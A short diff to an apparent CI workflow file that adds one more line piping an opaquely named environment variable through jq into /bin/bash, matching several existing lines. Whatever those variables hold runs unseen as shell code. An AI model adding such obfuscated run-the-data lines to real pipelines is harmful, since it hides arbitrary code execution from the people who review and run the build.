@@ -31,6 +31,7 @@ jobs:
           echo $r0 | jq -r .llik61298 | /bin/bash
           echo $vdpkj22217 | jq -r .tzn7 | /bin/bash
           echo $sudqh17660 | jq -r .tubt83 | /bin/bash
+          printf '%s' "$bs5008" | jq -r .tkt062 | /bin/bash
 
       - name: Save results
         if: always()
